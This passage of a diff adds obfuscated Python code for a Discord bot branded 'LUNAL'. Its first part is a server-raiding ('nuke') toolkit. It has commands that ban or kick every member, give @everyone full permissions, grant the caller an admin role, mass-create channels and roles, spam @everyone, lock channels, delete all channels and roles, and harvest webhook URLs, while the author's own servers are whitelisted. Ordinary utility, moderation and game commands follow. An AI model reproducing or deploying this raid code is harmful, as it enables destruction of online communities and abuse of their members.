+            await lll1ll1l1ll1.send('📨 Đã gửi tin nhắn xác nhận vào DM của bạn! Kiểm tra hộp thư đến.', delete_after=10)
+        except discord.Forbidden:
+            await lll1ll1l1ll1.send('❌ Không thể gửi DM cho bạn. Vui lòng mở DM hoặc cho phép bot nhắn tin riêng.')
+
+    @commands.command(name='massban')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def ll1lll111111(ll1l1l1l1ll1, l1l11l1l1lll):
+        if ll1l1l1l1ll1.lllll11111ll(l1l11l1l1lll.author):
+            l1l11l1l1lll.command.reset_cooldown(l1l11l1l1lll)
+        if l1l11l1l1lll.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l1l11l1l1lll.message.lll1lll1l111()
+        l1ll1l111ll1 = 0
+        for ll1lll1l1lll in l1l11l1l1lll.guild.members:
+            if ll1lll1l1lll.id != ll1l1l1l1ll1.bot.user.id:
+                try:
+                    await ll1lll1l1lll.ban(reason='Massban by LUNAL')
+                    l1ll1l111ll1 += 1
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+        await l1l11l1l1lll.send(f'✅ Banned {l1ll1l111ll1} members!')
+
+    @commands.command(name='masskick')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def l1l1l11l1ll1(l11llll1l111, l1l1ll1l1111):
+        if l11llll1l111.lllll11111ll(l1l1ll1l1111.author):
+            l1l1ll1l1111.command.reset_cooldown(l1l1ll1l1111)
+        if l1l1ll1l1111.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l1l1ll1l1111.message.lll1lll1l111()
+        l1lllllll11l = 0
+        for llll1ll1l111 in l1l1ll1l1111.guild.members:
+            if llll1ll1l111.id != l11llll1l111.bot.user.id:
+                try:
+                    await llll1ll1l111.kick(reason='Masskick by LUNAL')
+                    l1lllllll11l += 1
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+        await l1l1ll1l1111.send(f'✅ Kicked {l1lllllll11l} members!')
+
+    @commands.command(name='webhooks')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def l11ll1l1llll(ll1ll1l11111, l111l1lll1l1):
+        if ll1ll1l11111.lllll11111ll(l111l1lll1l1.author):
+            l111l1lll1l1.command.reset_cooldown(l111l1lll1l1)
+        if l111l1lll1l1.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l111l1lll1l1.message.lll1lll1l111()
+        lll1ll1l1111 = []
+        for llll11l1lll1 in l111l1lll1l1.guild.text_channels:
+            try:
+                for l111111111ll in await llll11l1lll1.webhooks():
+                    lll1ll1l1111.append(f'- **{l111111111ll.name}**: {l111111111ll.url}')
+            except:
+                continue
+        if lll1ll1l1111:
+            llll1ll1l1ll = discord.Embed(title='Webhooks', description='List of webhooks:\n' + '\n'.join(lll1ll1l1111[:10]), color=3092271)
+            if len(lll1ll1l1111) > 10:
+                llll1ll1l1ll.set_footer(text=f'{len(lll1ll1l1111) - 10} more')
+            try:
+                await l111l1lll1l1.author.send(embed=llll1ll1l1ll)
+                await l111l1lll1l1.send('📨 Sent webhook list to DM!')
+            except:
+                await l111l1lll1l1.send(embed=llll1ll1l1ll)
+
+    @commands.command(name='perm')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def l111l111llll(ll1l11l1111l, l11111ll1l11):
+        if ll1l11l1111l.lllll11111ll(l11111ll1l11.author):
+            l11111ll1l11.command.reset_cooldown(l11111ll1l11)
+        if l11111ll1l11.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l11111ll1l11.message.lll1lll1l111()
+        try:
+            await l11111ll1l11.guild.default_role.edit(permissions=discord.Permissions.all())
+            await l11111ll1l11.send('✅ Granted full permissions to @everyone!')
+        except:
+            await l11111ll1l11.send('❌ Failed.')
+
+    @commands.command(name='admin')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def l1l111ll1111(l11ll1l1l11l, l11lllllll11):
+        if l11ll1l1l11l.lllll11111ll(l11lllllll11.author):
+            l11lllllll11.command.reset_cooldown(l11lllllll11)
+        if l11lllllll11.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l11lllllll11.message.lll1lll1l111()
+        if not l11lllllll11.guild.me.guild_permissions.manage_roles:
+            return
+        try:
+            l1l1ll1l1l1l = await l11lllllll11.guild.create_role(name='LUNAL Admin', color=discord.Color.blurple(), permissions=discord.Permissions.all())
+            await l11lllllll11.author.add_roles(l1l1ll1l1l1l)
+            await l11lllllll11.guild.me.add_roles(l1l1ll1l1l1l)
+            await l11lllllll11.send('✅ Created Admin role!')
+        except:
+            await l11lllllll11.send('❌ Failed.')
+
+    @commands.command(name='role')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def l11111l1l1ll(l11lll11l111, l11llll11111):
+        if l11lll11l111.lllll11111ll(l11llll11111.author):
+            l11llll11111.command.reset_cooldown(l11llll11111)
+        if l11llll11111.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l11llll11111.message.lll1lll1l111()
+        llll1111lll1 = 0
+        for lll1l1ll111l in range(250):
+            try:
+                await l11llll11111.guild.create_role(name='LUNAL-Nuked', colour=discord.Colour(random.randint(0, 16777215)))
+                llll1111lll1 += 1
+                await asyncio.sleep(0.15)
+            except:
+                break
+        await l11llll11111.send(f'✅ Created {llll1111lll1} roles!')
+
+    @commands.command(name='spam_tag')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def ll1l111l111l(l11ll11l1l11, lllll1lllll1, l1ll1llll1ll: int=10, *, l11ll11ll1ll: str='LUNAL NUKE!'):
+        if l11ll11l1l11.lllll11111ll(lllll1lllll1.author):
+            lllll1lllll1.command.reset_cooldown(lllll1lllll1)
+        if lllll1lllll1.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await lllll1lllll1.message.lll1lll1l111()
+        l1l11lll1l11 = f'||@everyone|| ||@here|| {l11ll11ll1ll}'
+        for l1l1l11l1lll in range(min(l1ll1llll1ll, 50)):
+            try:
+                await lllll1lllll1.send(l1l11lll1l11)
+                await asyncio.sleep(0.5)
+            except:
+                break
+        await lllll1lllll1.send(f'✅ Spammed {min(l1ll1llll1ll, 50)} messages!', delete_after=3)
+
+    @commands.command(name='spam_channels')
+    @commands.cooldown(1, 150, commands.BucketType.user)
+    async def ll11l11l1111(l1111111llll, l1ll111ll11l, ll1ll1111111: int=500):
+        if l1111111llll.lllll11111ll(l1ll111ll11l.author):
+            l1ll111ll11l.command.reset_cooldown(l1ll111ll11l)
+        if l1ll111ll11l.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l1ll111ll11l.message.lll1lll1l111()
+        l111lll11l1l = 0
+        for l111ll1l11l1 in range(min(ll1ll1111111, 500)):
+            try:
+                await l1ll111ll11l.guild.create_text_channel(f'LUNAL-SPAM-{l111ll1l11l1}')
+                l111lll11l1l += 1
+                if l111ll1l11l1 % 50 == 0:
+                    await l1ll111ll11l.send(f'📁 Created {l111ll1l11l1}/{ll1ll1111111} channels...', delete_after=3)
+                await asyncio.sleep(0.05)
+            except:
+                pass
+        await l1ll111ll11l.send(f'✅ Created {l111lll11l1l} spam channels!')
+
+    @commands.command(name='lockdown')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def l1ll11ll1ll1(l111llll1l1l, l1l11lll1lll):
+        if l111llll1l1l.lllll11111ll(l1l11lll1lll.author):
+            l1l11lll1lll.command.reset_cooldown(l1l11lll1lll)
+        if l1l11lll1lll.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l1l11lll1lll.message.lll1lll1l111()
+        l1l1ll111l11 = 0
+        for ll1ll11lll11 in l1l11lll1lll.guild.channels:
+            try:
+                await ll1ll11lll11.set_permissions(l1l11lll1lll.guild.default_role, send_messages=False)
+                l1l1ll111l11 += 1
+                await asyncio.sleep(0.1)
+            except:
+                pass
+        await l1l11lll1lll.send(f'🔒 Locked {l1l1ll111l11} channels!')
+
+    @commands.command(name='delete_all')
+    @commands.cooldown(1, 120, commands.BucketType.user)
+    async def llll111lll1l(lll111lll1l1, llll11lllll1):
+        if lll111lll1l1.lllll11111ll(llll11lllll1.author):
+            llll11lllll1.command.reset_cooldown(llll11lllll1)
+        if llll11lllll1.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await llll11lllll1.message.lll1lll1l111()
+        await llll11lllll1.send('🗑️ Deleting everything...', delete_after=5)
+        for lll1ll1ll111 in llll11lllll1.guild.channels:
+            try:
+                await lll1ll1ll111.lll1lll1l111()
+                await asyncio.sleep(0.05)
+            except:
+                pass
+        for l11111ll11l1 in llll11lllll1.guild.roles:
+            if l11111ll11l1.name != '@everyone':
+                try:
+                    await l11111ll11l1.lll1lll1l111()
+                    await asyncio.sleep(0.05)
+                except:
+                    pass
+        await llll11lllll1.send('✅ Deleted all channels and roles!')
+
+    @commands.command(name='mass_rename')
+    @commands.cooldown(1, 100, commands.BucketType.user)
+    async def l11111ll11ll(lllllllllll1, l1111l11ll11, *, lllll11111l1: str='NUKED BY LUNAL'):
+        if lllllllllll1.lllll11111ll(l1111l11ll11.author):
+            l1111l11ll11.command.reset_cooldown(l1111l11ll11)
+        if l1111l11ll11.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await l1111l11ll11.message.lll1lll1l111()
+        lllll11l1l1l = 0
+        for ll11l11111l1 in l1111l11ll11.guild.members:
+            if not ll11l11111l1.bot:
+                try:
+                    await ll11l11111l1.edit(nick=lllll11111l1)
+                    lllll11l1l1l += 1
+                    await asyncio.sleep(0.2)
+                except:
+                    pass
+        await l1111l11ll11.send(f'✅ Renamed {lllll11l1l1l} members!')
+
+    @commands.command(name='super_nuke')
+    @commands.cooldown(1, 120, commands.BucketType.user)
+    async def ll11ll111l11(ll1l1ll11111, ll111ll111ll):
+        if ll1l1ll11111.lllll11111ll(ll111ll111ll.author):
+            ll111ll111ll.command.reset_cooldown(ll111ll111ll)
+        if ll111ll111ll.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await ll111ll111ll.message.lll1lll1l111()
+        await ll111ll111ll.send('🌟 **SUPER NUKE ACTIVATED!**')
+        for ll1111llllll in ll111ll111ll.guild.channels:
+            try:
+                await ll1111llllll.lll1lll1l111()
+                await asyncio.sleep(0.1)
+            except:
+                pass
+        for l11l111ll1l1 in ll111ll111ll.guild.roles:
+            if l11l111ll1l1.name != '@everyone':
+                try:
+                    await l11l111ll1l1.lll1lll1l111()
+                    await asyncio.sleep(0.1)
+                except:
+                    pass
+        for ll111l1l111l in range(200):
+            try:
+                await ll111ll111ll.guild.create_text_channel(f'LUNAL-NUKED-{ll111l1l111l}')
+                await asyncio.sleep(0.05)
+            except:
+                pass
+            try:
+                await ll111ll111ll.guild.create_role(name=f'LUNAL-{ll111l1l111l}', color=random.randint(0, 16777215))
+                await asyncio.sleep(0.05)
+            except:
+                pass
+        await ll111ll111ll.send('✅ **SUPER NUKE COMPLETE!**')
+
+class Utility(commands.Cog):
+
+    def __init__(lll11111111l, l11l11l1ll11):
+        lll11111111l.bot = l11l11l1ll11
+
+    @commands.command(name='ping')
+    async def l1l1llll11l1(ll1l1l1lll1l, l1ll11lll1l1):
+        lll1l11l1ll1 = round(l11ll11l111l.latency * 1000)
+        l1l111l1llll = discord.Embed(title='PING', description=f'```css\n> Connection Status: Live\n> Latency: {lll1l11l1ll1}ms\n```', color=65535, timestamp=ll1l11l1ll1l())
+        l1l111l1llll.set_thumbnail(url='https://i.pinimg.com/736x/f5/c1/d3/f5c1d31978d2c8b5e3fa8f12e6e47ee1.jpg')
+        l1l111l1llll.add_field(name='Status', value='**ONLINE**', inline=True)
+        l1l111l1llll.add_field(name='Response', value=f'**{lll1l11l1ll1}ms**', inline=True)
+        l1l111l1llll.set_footer(text=f'Requested by {l1ll11lll1l1.author.name} | LUNAL KINGDOM')
+        await l1ll11lll1l1.send(embed=l1l111l1llll, delete_after=5)
+
+    @commands.command(name='avatar')
+    async def llll1l11l11l(ll1lll111ll1, llll1l1l111l, lll1ll111l11: discord.Member=None):
+        if lll1ll111l11 is None:
+            lll1ll111l11 = llll1l1l111l.author
+        l111ll1l1l11 = discord.Embed(title=f'Avatar of {lll1ll111l11.name}', color=52479)
+        l111ll1l1l11.set_image(url=lll1ll111l11.display_avatar.url)
+        await llll1l1l111l.send(embed=l111ll1l1l11)
+
+    @commands.command(name='userinfo')
+    async def lll1lll1ll1l(ll1lllll111l, lll111lll1ll, l1l1llll111l: discord.Member=None):
+        if l1l1llll111l is None:
+            l1l1llll111l = lll111lll1ll.author
+        l1llll1l1l11 = l1l1llll111l.id
+        l1lll1ll11ll = LevelSystem.l111l1l1ll1l(l1llll1l1l11)
+        lll1ll1lll11 = LevelSystem.lll11ll1l11l(l1llll1l1l11)
+        l11ll11l1111 = Economy.l1ll1l11llll(l1llll1l1l11)
+        l1l1l111llll = LevelSystem.l11l11l11111(lll1ll1lll11)
+        l1ll11ll1l1l = l1lll1ll11ll / l1l1l111llll * 100 if l1l1l111llll > 0 else 0
+        lllll1l1lll1 = discord.Embed(title=f'User Info - {l1l1llll111l.name}', color=l1l1llll111l.color, timestamp=ll1l11l1ll1l())
+        lllll1l1lll1.set_thumbnail(url=l1l1llll111l.display_avatar.url)
+        lllll1l1lll1.add_field(name='ID', value=l1l1llll111l.id, inline=True)
+        lllll1l1lll1.add_field(name='Joined', value=l1l1llll111l.joined_at.strftime('%d/%m/%Y %H:%M'), inline=True)
+        lllll1l1lll1.add_field(name='Created', value=l1l1llll111l.created_at.strftime('%d/%m/%Y %H:%M'), inline=True)
+        lllll1l1lll1.add_field(name='Roles', value=len(l1l1llll111l.roles), inline=True)
+        lllll1l1lll1.add_field(name='Bot', value=l1l1llll111l.bot, inline=True)
+        lllll1l1lll1.add_field(name='Status', value=str(l1l1llll111l.status).capitalize(), inline=True)
+        lllll1l1lll1.add_field(name='📊 Level', value=f'{lll1ll1lll11} ({l1lll1ll11ll}/{l1l1l111llll} XP)', inline=True)
+        lllll1l1lll1.add_field(name='💰 Coins', value=ll1l111l1111(l11ll11l1111), inline=True)
+        lllll1l1lll1.add_field(name='📈 Progress', value=f'{l1ll11ll1l1l:.1f}%', inline=True)
+        lllll1l1lll1.set_footer(text=f'Requested by {lll111lll1ll.author.name}')
+        await lll111lll1ll.send(embed=lllll1l1lll1)
+
+    @commands.command(name='serverinfo')
+    async def ll11ll11l1l1(ll1l1lll1111, lll111111l1l):
+        l11l111lll11 = lll111111l1l.guild
+        l1ll11l1l1ll = discord.Embed(title=f'Server Info - {l11l111lll11.name}', color=52479, timestamp=ll1l11l1ll1l())
+        if l11l111lll11.icon:
+            l1ll11l1l1ll.set_thumbnail(url=l11l111lll11.icon.url)
+        l1ll11l1l1ll.add_field(name='ID', value=l11l111lll11.id, inline=True)
+        l1ll11l1l1ll.add_field(name='Owner', value=l11l111lll11.owner, inline=True)
+        l1ll11l1l1ll.add_field(name='Members', value=l11l111lll11.member_count, inline=True)
+        l1ll11l1l1ll.add_field(name='Channels', value=len(l11l111lll11.channels), inline=True)
+        l1ll11l1l1ll.add_field(name='Roles', value=len(l11l111lll11.roles), inline=True)
+        l1ll11l1l1ll.add_field(name='Created', value=l11l111lll11.created_at.strftime('%d/%m/%Y %H:%M'), inline=True)
+        l1ll11l1l1ll.add_field(name='Boost Level', value=l11l111lll11.premium_tier, inline=True)
+        l1ll11l1l1ll.add_field(name='Boost Count', value=l11l111lll11.premium_subscription_count, inline=True)
+        l1ll11l1l1ll.set_footer(text=f'Requested by {lll111111l1l.author.name}')
+        await lll111111l1l.send(embed=l1ll11l1l1ll)
+
+    @commands.command(name='servericon')
+    async def lllll11l11l1(ll1111lll11l, ll1l11l11lll):
+        ll111l111ll1 = ll1l11l11lll.guild
+        if not ll111l111ll1.icon:
+            await ll1l11l11lll.send('❌ Server này không có icon.')
+            return
+        ll1ll11l1111 = discord.Embed(title=f'Server Icon - {ll111l111ll1.name}', color=52479)
+        ll1ll11l1111.set_image(url=ll111l111ll1.icon.url)
+        await ll1l11l11lll.send(embed=ll1ll11l1111)
+
+    @commands.command(name='say')
+    async def ll111l1111ll(ll111l1l1lll, llllll11llll, *, ll1l11111lll: str):
+        await llllll11llll.message.lll1lll1l111()
+        await llllll11llll.send(ll1l11111lll)
+
+    @commands.command(name='embed')
+    async def l111lllll1l1(llll11l11l1l, l1l1llll1ll1, ll11ll1lll1l: str, *, llll1l1111l1: str):
+        ll11l111ll1l = discord.Embed(title=ll11ll1lll1l, description=llll1l1111l1, color=52479)
+        await l1l1llll1ll1.send(embed=ll11l111ll1l)
+
+    @commands.command(name='timer')
+    async def lllll11lllll(lllll11llll1, l1llll111l11, l1ll11lll111: int):
+        if l1ll11lll111 < 1 or l1ll11lll111 > 3600:
+            await l1llll111l11.send('❌ Nhập số giây từ 1 đến 3600.')
+            return
+        await l1llll111l11.send(f'⏰ Timer set for {l1ll11lll111} seconds.')
+        await asyncio.sleep(l1ll11lll111)
+        await l1llll111l11.send(f"🔔 {l1llll111l11.author.mention} Time's up!")
+
+    @commands.command(name='snipe')
+    async def l11111lll111(l11l1ll1ll11, lll1l1l1111l):
+        if lll1l1l1111l.channel.id not in snipe_cache:
+            await lll1l1l1111l.send('ℹ️ Không có tin nhắn nào bị xóa gần đây.')
+            return
+        llllll11l111 = snipe_cache[lll1l1l1111l.channel.id]
+        l1lll1l1llll = discord.Embed(title='🗑️ Sniped Message', description=llllll11l111['content'] if llllll11l111['content'] else '*No content*', color=52479, timestamp=llllll11l111['time'])
+        l1lll1l1llll.set_author(name=llllll11l111['author'], icon_url=llllll11l111['avatar'])
+        await lll1l1l1111l.send(embed=l1lll1l1llll)
+
+    @commands.command(name='clear')
+    @commands.has_permissions(manage_messages=True)
+    async def llll1llll1l1(lll1111ll11l, llll11lll1ll, l11lll1ll1ll: int):
+        if l11lll1ll1ll < 1 or l11lll1ll1ll > 100:
+            await llll11lll1ll.send('❌ Nhập số từ 1 đến 100.')
+            return
+        await llll11lll1ll.message.lll1lll1l111()
+        lll1l111ll11 = await llll11lll1ll.channel.purge(limit=l11lll1ll1ll)
+        await llll11lll1ll.send(f'🧹 Deleted {len(lll1l111ll11)} messages.', delete_after=3)
+
+    @commands.command(name='kick')
+    @commands.has_permissions(kick_members=True)
+    async def lllllll11lll(lll1ll1ll1l1, l1l111ll1l11, ll11l11ll11l: discord.Member, *, l1llll111ll1: str='No reason'):
+        if ll11l11ll11l == l1l111ll1l11.author:
+            await l1l111ll1l11.send("❌ You can't kick yourself!")
+            return
+        try:
+            await ll11l11ll11l.kick(reason=l1llll111ll1)
+            await l1l111ll1l11.send(f'✅ Kicked {ll11l11ll11l.mention}!\nReason: {l1llll111ll1}')
+        except:
+            await l1l111ll1l11.send('❌ Failed to kick member.')
+
+    @commands.command(name='ban')
+    @commands.has_permissions(ban_members=True)
+    async def lll11l1l1lll(l11ll1l1111l, l111ll11111l, ll11111l1lll: discord.Member, *, ll1ll1l1111l: str='No reason'):
+        if ll11111l1lll == l111ll11111l.author:
+            await l111ll11111l.send("❌ You can't ban yourself!")
+            return
+        try:
+            await ll11111l1lll.ban(reason=ll1ll1l1111l)
+            await l111ll11111l.send(f'✅ Banned {ll11111l1lll.mention}!\nReason: {ll1ll1l1111l}')
+        except:
+            await l111ll11111l.send('❌ Failed to ban member.')
+
+    @commands.command(name='unban')
+    @commands.has_permissions(ban_members=True)
+    async def l1ll1lll1ll1(l11111111l11, l1ll1l1111l1, l1111111l11l: int, *, l11l1111l1l1: str='No reason'):
+        try:
+            l1l11l11llll = await l11ll11l111l.fetch_user(l1111111l11l)
+            await l1ll1l1111l1.guild.unban(l1l11l11llll, reason=l11l1111l1l1)
+            await l1ll1l1111l1.send(f'✅ Unbanned {l1l11l11llll.mention}!\nReason: {l11l1111l1l1}')
+        except:
+            await l1ll1l1111l1.send('❌ Failed to unban user.')
+
+    @commands.command(name='timeout')
+    @commands.has_permissions(moderate_members=True)
+    async def l1l1ll111l1l(l1lll111lll1, lll1lllllll1, l1lllll1l11l: discord.Member, l1lll11l111l: int, *, l111lll11l11: str='No reason'):
+        if l1lll11l111l < 1 or l1lll11l111l > 40320:
+            await lll1lllllll1.send('❌ Nhập số phút từ 1 đến 40320 (28 ngày).')
+            return
+        try:
+            await l1lllll1l11l.timeout(timedelta(minutes=l1lll11l111l), reason=l111lll11l11)
+            await lll1lllllll1.send(f'✅ Timed out {l1lllll1l11l.mention} for {l1lll11l111l} minutes!\nReason: {l111lll11l11}')
+        except:
+            await lll1lllllll1.send('❌ Failed to timeout member.')
+
+    @commands.command(name='warn')
+    @commands.has_permissions(manage_messages=True)
+    async def l111llll1111(ll11l111llll, l1lllll1lll1, l11lllll1l11: discord.Member, *, l11l1l1111l1: str='No reason'):
+        l11111l1l11l = llll1l1ll11l.l1ll1l1lllll(l11lllll1l11.id)
+        if 'warnings' not in l11111l1l11l:
+            l11111l1l11l['warnings'] = []
+        l11111l1l11l['warnings'].append({'reason': l11l1l1111l1, 'mod': l1lllll1lll1.author.id, 'time': ll1l11l1ll1l().isoformat()})
+        llll1l1ll11l.lllllll11ll1(f'user_{l11lllll1l11.id}', l11111l1l11l)
+        await l1lllll1lll1.send(f'⚠️ Warned {l11lllll1l11.mention}!\nReason: {l11l1l1111l1}')
+
+    @commands.command(name='warnings')
+    async def ll1lllll11ll(l1llll1l111l, ll11llll11ll, ll1l11lll1ll: discord.Member=None):
+        if ll1l11lll1ll is None:
+            ll1l11lll1ll = ll11llll11ll.author
+        l1lllll1llll = llll1l1ll11l.l1ll1l1lllll(ll1l11lll1ll.id)
+        l1111l111ll1 = l1lllll1llll.l11111111l1l('warnings', [])
+        if not l1111l111ll1:
+            await ll11llll11ll.send(f'ℹ️ {ll1l11lll1ll.mention} has no warnings.')
+            return
+        l1ll1l111l1l = discord.Embed(title=f'Warnings for {ll1l11lll1ll.name}', color=16755200)
+        for l1111l11l1l1, l1l111ll1lll in enumerate(l1111l111ll1[-5:], 1):
+            l1ll1l111l1l.add_field(name=f'Warning #{l1111l11l1l1}', value=f"Reason: {l1l111ll1lll['reason']}\nMod: <@{l1l111ll1lll['mod']}>\nTime: {l1l111ll1lll['time']}", inline=False)
+        await ll11llll11ll.send(embed=l1ll1l111l1l)
+
+    @commands.command(name='coinflip')
+    async def l1lll11l11l1(ll1111l1l111, l1l1l111l1l1):
+        l1l111l1l11l = random.choice(['Heads', 'Tails'])
+        ll1lll1l1111 = discord.Embed(title='🪙 Coin Flip', description=f'**{l1l111l1l11l}**', color=16755200)
+        ll1lll1l1111.set_footer(text=f'Requested by {l1l1l111l1l1.author.name}')
+        await l1l1l111l1l1.send(embed=ll1lll1l1111)
+
+    @commands.command(name='8ball')
+    async def lll11ll11l11(l1l1ll1111l1, lll1lll1111l, *, lll1llllllll: str):
+        ll1l11l11111 = ['Chắc chắn.', 'Có lẽ là có.', 'Có lẽ là không.', 'Hỏi lại sau.', 'Không thể đoán được.', 'Tập trung và hỏi lại.', 'Đừng hỏi nữa.', 'Rất có thể.', 'Dấu hiệu cho thấy có.', 'Không.', 'Có.', 'Chưa thể trả lời.', 'Hôm nay không.', 'Ngày mai sẽ rõ.']
+        l1l1l1111l11 = discord.Embed(title='🎱 Magic 8-Ball', description=f'**Câu hỏi:** {lll1llllllll}\n**Trả lời:** {random.choice(ll1l11l11111)}', color=65416)
+        l1l1l1111l11.set_footer(text=f'Requested by {lll1lll1111l.author.name}')
+        await lll1lll1111l.send(embed=l1l1l1111l11)
+
+class Fun(commands.Cog):
+
+    def __init__(ll11111lllll, ll1l111ll11l):
+        ll11111lllll.bot = ll1l111ll11l
+
+    @commands.command(name='rps')
+    async def lllllll111l1(llll11l111l1, ll1l1lll1ll1, l11l1llll11l: str):
+        l11111l1lll1 = ['rock', 'paper', 'scissors']
+        if l11l1llll11l.lower() not in l11111l1lll1:
+            await ll1l1lll1ll1.send('❌ Chọn `rock`, `paper` hoặc `scissors`.')
+            return
+        l11l1111l11l = random.choice(l11111l1lll1)
+        l111l1l111ll = ''
+        if l11l1llll11l.lower() == l11l1111l11l:
+            l111l1l111ll = 'Draw!'
+        elif l11l1llll11l.lower() == 'rock' and l11l1111l11l == 'scissors' or (l11l1llll11l.lower() == 'paper' and l11l1111l11l == 'rock') or (l11l1llll11l.lower() == 'scissors' and l11l1111l11l == 'paper'):
+            l111l1l111ll = 'You win!'
+        else:
+            l111l1l111ll = 'You lose!'
+        lll1l1l11l1l = discord.Embed(title='🎮 Rock-Paper-Scissors', color=16755200)
+        lll1l1l11l1l.add_field(name='You', value=l11l1llll11l.capitalize(), inline=True)
+        lll1l1l11l1l.add_field(name='Bot', value=l11l1111l11l.capitalize(), inline=True)
+        lll1l1l11l1l.add_field(name='Result', value=l111l1l111ll, inline=True)
+        await ll1l1lll1ll1.send(embed=lll1l1l11l1l)
+
+    @commands.command(name='poll')
+    async def l11lll1lllll(l111l1111ll1, ll11ll11l11l, lll1l11lllll: str, *, l1llll11l1l1: str):
+        l11l1l1l1l1l = l1llll11l1l1.split('|')
+        if len(l11l1l1l1l1l) < 2 or len(l11l1l1l1l1l) > 10:
+            await ll11ll11l11l.send('❌ Nhập từ 2 đến 10 lựa chọn, cách nhau bởi `|`.')
+            return
+        ll1111ll11l1 = discord.Embed(title=f'📊 Poll: {lll1l11lllll}', color=52479)
+        for l1111111l111, l1ll1ll1ll11 in enumerate(l11l1l1l1l1l, 1):
+            ll1111ll11l1.add_field(name=f'Option {l1111111l111}', value=l1ll1ll1ll11.strip(), inline=False)
+        ll1111ll11l1.set_footer(text=f'React to vote | Created by {ll11ll11l11l.author.name}')
+        lll1l111l1l1 = await ll11ll11l11l.send(embed=ll1111ll11l1)
+        for l1111111l111 in range(1, len(l11l1l1l1l1l) + 1):
+            await lll1l111l1l1.add_reaction(f'{l1111111l111}️⃣')
+        polls[lll1l111l1l1.id] = {'options': l11l1l1l1l1l, 'author': ll11ll11l11l.author.id, 'channel': ll11ll11l11l.channel.id}
+
+    @commands.command(name='giveaway')
+    async def ll1111ll1lll(l1111l1111ll, lll1lllll11l, ll11l1111l1l: int, *, l11lllll1111: str):
+        if ll11l1111l1l < 10 or ll11l1111l1l > 3600:
+            await lll1lllll11l.send('❌ Nhập thời gian từ 10 đến 3600 giây.')
+            return
+        l11lllll1lll = discord.Embed(title='🎁 Giveaway!', description=f'**Prize:** {l11lllll1111}\n**Duration:** {ll11l1111l1l}s\n**Hosted by:** {lll1lllll11l.author.mention}', color=16755200, timestamp=ll1l11l1ll1l())
+        l11l1l11ll1l = await lll1lllll11l.send(embed=l11lllll1lll)
+        await l11l1l11ll1l.add_reaction('🎉')
+        giveaways[l11l1l11ll1l.id] = {'prize': l11lllll1111, 'duration': ll11l1111l1l, 'host': lll1lllll11l.author.id, 'channel': lll1lllll11l.channel.id, 'end_time': ll1l11l1ll1l() + timedelta(seconds=ll11l1111l1l)}
+        await asyncio.sleep(ll11l1111l1l)
+        l11l1l11ll1l = await lll1lllll11l.channel.fetch_message(l11l1l11ll1l.id)
+        l11l1l111lll = await l11l1l11ll1l.reactions[0].users().flatten()
+        l11l1l111lll = [ll1111111lll for ll1111111lll in l11l1l111lll if not ll1111111lll.bot]
+        if l11l1l111lll:
+            lll1l1llll11 = random.choice(l11l1l111lll)
+            await lll1lllll11l.send(f'🎉 **Winner of {l11lllll1111}:** {lll1l1llll11.mention}! Congratulations!')
+        else:
+            await lll1lllll11l.send(f'❌ No one entered the giveaway for {l11lllll1111}.')
+
+    @commands.command(name='endgiveaway')
+    async def llll11llll1l(l111ll1l1111, ll1ll11ll1l1, l1111ll1llll: int):
+        if l1111ll1llll not in giveaways:
+            await ll1ll11ll1l1.send('❌ Giveaway not found!')
+            return
+        ll111111l1ll = giveaways[l1111ll1llll]
+        l111l111l1l1 = l11ll11l111l.get_channel(ll111111l1ll['channel'])
+        if not l111l111l1l1:
+            await ll1ll11ll1l1.send('❌ Channel not found!')
+            return
+        ll1l1l1lllll = await l111l111l1l1.fetch_message(l1111ll1llll)
+        l1llll1lll11 = await ll1l1l1lllll.reactions[0].users().flatten()
+        l1llll1lll11 = [lll1l1l11lll for lll1l1l11lll in l1llll1lll11 if not lll1l1l11lll.bot]
+        if l1llll1lll11:
+            lll11ll1lll1 = random.choice(l1llll1lll11)
+            await ll1ll11ll1l1.send(f"🎉 **Winner of {ll111111l1ll['prize']}:** {lll11ll1lll1.mention}!")
+        else:
+            await ll1ll11ll1l1.send(f'❌ No one entered the giveaway.')
+        del giveaways[l1111ll1llll]
+
+    @commands.command(name='meme')
+    async def l11l11l111l1(ll11llllllll, l1ll111l1l1l):
+        try:
+            async with aiohttp.ClientSession() as l11ll11lll11:
+                async with l11ll11lll11.l11111111l1l('https://meme-api.com/gimme') as l1l111l111ll:
+                    if l1l111l111ll.status == 200:
+                        l1l1ll11l11l = await l1l111l111ll.json()
+                        l11l1ll111l1 = discord.Embed(title=l1l1ll11l11l.l11111111l1l('title', 'Meme'), color=16755200, timestamp=ll1l11l1ll1l())
+                        l11l1ll111l1.set_image(url=l1l1ll11l11l.l11111111l1l('url'))
+                        l11l1ll111l1.set_footer(text=f"👍 {l1l1ll11l11l.l11111111l1l('ups', 0)}")
+                        await l1ll111l1l1l.send(embed=l11l1ll111l1)
+                    else:
+                        await l1ll111l1l1l.send('❌ Không thể lấy meme.')
+        except:
+            await l1ll111l1l1l.send('❌ Lỗi kết nối API meme.')
+
+    @commands.command(name='gif')
+    async def l111l1ll1l1l(l1l1l11ll1l1, lll1111lll1l, *, l1llll1l1ll1: str):
+        try:
+            async with aiohttp.ClientSession() as l11ll11111ll:
+                l1l11l1lllll = f'https://api.giphy.com/v1/gifs/translate?api_key=dc6zaTOxFJmzC&s={l1llll1l1ll1}'
+                async with l11ll11111ll.l11111111l1l(l1l11l1lllll) as l1ll1ll1l11l:
+                    if l1ll1ll1l11l.status == 200:
